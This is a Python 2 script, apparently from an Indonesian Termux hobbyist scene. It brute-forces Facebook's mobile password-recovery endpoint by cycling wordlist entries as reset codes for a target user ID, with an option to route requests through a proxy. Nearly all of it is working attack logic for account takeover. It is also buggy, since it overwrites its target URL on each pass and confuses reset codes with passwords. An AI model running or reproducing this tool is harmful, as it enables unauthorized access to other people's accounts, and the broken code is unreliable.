#Recode gapapa

H = '\033[95m'
B = '\033[94m'
G = '\033[92m'
W = '\033[93m'
F = '\033[91m'
E = '\033[0m'
U = '\033[4m'
O = '\033[33m'

import urllib2 ,sys ,re
import os
import ssl
import time

def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux,windows][os.name == 'nt'])

cls()

os.system(['','color D'][os.name == 'nt'])

print F+'''
 TERMUX - INDONESIA

Thanks : Bang risky(coding) Ubaii ID(coding) all member
TERMUX INDONESIA '''
if len(sys.argv) != 3:
    print G+"\n\n[#] Penulisan: python2 fb.py [TagetID] [pas.txt] "
    sys.exit()

target = sys.argv[1]
wordlist = sys.argv[2]


while True:
    print """
		       IG BRUTE FORCE
    ============ Mode ==============
    1- (1) Tebak Password
    2- (2) Lihat password
    
    """

    choice=raw_input("MasukaN  Pilihan Mu: ")

    if choice=="1":
        try:
            word = open(wordlist, 'r').readlines()
            print G+"[+] Kode Nya Tersimpan \!/\n[+] E+Codes:",len(word)
        except("IOError"):
            print "[-] Format Salah!"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()
    
            except IOError:
                print F+" Tidak ada koneksi!!"
    
            search = re.search('password_new', get)
            if search:
                print "[+] Password : "+w+" Benar."
            else:
                print O+"[+] password : "+w+" Salah. "
    else:

        print """

        Insert password membutuhkan proxy!
        masukkan proxy anda

        Penggunaan : [ip:port]


        """
        ip_proxy=raw_input("Masukan Proxy  : ")
        print "[##] Proxy Terpasang : "+ip_proxy
        proxy = urllib2.ProxyHandler({'http': ip_proxy})
        opener = urllib2.build_opener(proxy)
        urllib2.install_opener(opener)
        
        #ip = urllib2.urlopen('http://checkip.dyndns.org').read()
        #theIP = re.findall(r"\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}", ip)
        #print theIP
        #datum = response.read()
        #response.close()
        #print datum
        try:
            word = open(wordlist, 'r').readlines()
            print F+"[+] Kode Reset Tersimpan \!/\n[+] Kode:",len(word)
        except("IOError"):
            print "[-] Gagal input!!"
            sys.exit(1);

        for w in word:
            w = w.rstrip()
            try:
                target = 'https://m.facebook.com/recover/password?u='+target+'&n='+w
                get = urllib2.urlopen(target).read()
                
            except IOError:
                print " Tidak ada koneksi!!"
        
            search = re.search('password_new', get)
            if search:
                print "[+] password : "+w+" Benar."
            else:
                print "[+] password: "+w+" Salah."